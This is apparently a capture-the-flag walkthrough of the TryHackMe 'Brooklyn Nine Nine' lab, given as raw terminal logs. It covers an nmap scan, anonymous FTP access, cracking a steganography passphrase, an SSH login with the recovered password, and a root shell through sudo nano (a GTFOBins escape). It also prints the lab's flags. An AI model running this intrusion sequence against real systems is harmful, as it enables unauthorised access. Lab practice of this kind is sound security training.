nmap results

┌──(kali㉿kali)-[~/…/tryhackme/thm/brooklyn99/nmap_results]
└─$ nmap -sC -sV -vv 10.10.41.112 -oA results
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-08 20:02 EDT
...
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.58.120
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
...
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel.
...
FTP:

┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ ftp 10.10.41.112
Connected to 10.10.41.112.
220 (vsFTPd 3.0.3)
Name (10.10.41.112:kali): Anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> mget *
mget note_to_jake.txt [anpqy?]? 
229 Entering Extended Passive Mode (|||30422|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |****************************************************|   119        1.29 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.66 KiB/s)
ftp> bye
221 Goodbye.



note to jake:
┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine




Steganography:
┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ steghide extract -sf brooklyn_steg.jpg
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.


┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ stegcracker brooklyn_steg.jpg -o stegpass.txt   
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2023 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

No wordlist was specified, using default rockyou.txt wordlist.
Counting lines in wordlist..
Attacking file 'brooklyn_steg.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: stegpass.txt
admin



┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ steghide extract -sf brooklyn_steg.jpg       
Enter passphrase: 
wrote extracted data to "note.txt".
                                                                                                 
┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ cat note.txt        
Holts Password:
fluffydog12@ninenine

Enjoy!!


ssh login:
┌──(kali㉿kali)-[~/Desktop/tryhackme/thm/brooklyn99]
└─$ ssh holt@10.10.41.112                 
The authenticity of host '10.10.41.112 (10.10.41.112)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.41.112' (ED25519) to the list of known hosts.
holt@10.10.41.112's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ 

user flag:
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
holt@brookly_nine_nine:~$ 



sudo nano:
holt@brookly_nine_nine:/home$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano


https://gtfobins.github.io/gtfobins/nano/#sudo
sudo nano
^R^X
reset; sh 1>&0 2>&0

nano root
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

